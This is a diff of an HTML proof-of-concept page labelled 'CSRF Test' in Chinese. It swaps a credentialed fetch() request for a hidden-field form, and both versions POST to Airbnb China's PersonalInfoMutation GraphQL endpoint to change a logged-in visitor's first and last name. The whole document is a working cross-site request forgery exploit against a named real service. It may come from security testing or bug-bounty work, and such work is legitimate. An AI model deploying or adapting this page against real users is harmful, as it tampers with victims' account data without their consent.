@@ -1,19 +1,18 @@
 <!DOCTYPE html>
 <html>
+<head>
+<meta charset="utf-8">
+<title>CSRF Test</title>
+</head>
 <body>
-<script>
-fetch("https://www.airbnb.cn/api/v3/PersonalInfoMutation/1b6fb7e6ce6858f751756606693a13a63a15a39e21bd16e06cfdab3c9f6b2431?operationName=PersonalInfoMutation&locale=zh-CN&currency=CNY", {
-  method: "POST",
-  credentials: "include",
-  headers: {
-    "Content-Type": "application/json",
-    "X-CSRF-Without-Token": "1"
-  },
-  body: JSON.stringify({"operationName":"PersonalInfoMutation","variables":{"coreUserData":{"firstName":"志","lastName":"张"}},"extensions":{"persistedQuery":{"version":1,"sha256Hash":"1b6fb7e6ce6858f751756606693a13a63a15a39e21bd16e06cfdab3c9f6b2431"}}})
-}).then(res => res.text()).then(result => {
-  console.log("返回结果：", result);
-  alert("请求完成，请打开F12控制台查看返回内容");
-})
-</script>
+<form 
+  action="https://www.airbnb.cn/api/v3/PersonalInfoMutation/1b6fb7e6ce6858f751756606693a13a63a15a39e21bd16e06cfdab3c9f6b2431?operationName=PersonalInfoMutation&locale=zh-CN&currency=CNY" 
+  method="POST"
+  enctype="application/json"
+  target="_blank"
+>
+<input type="hidden" name="payload" value='{"operationName":"PersonalInfoMutation","variables":{"coreUserData":{"firstName":"志","lastName":"张"}},"extensions":{"persistedQuery":{"version":1,"sha256Hash":"1b6fb7e6ce6858f751756606693a13a63a15a39e21bd16e06cfdab3c9f6b2431"}}}' >
+<button type="submit">点击发起CSRF测试请求</button>
+</form>
 </body>
 </html>
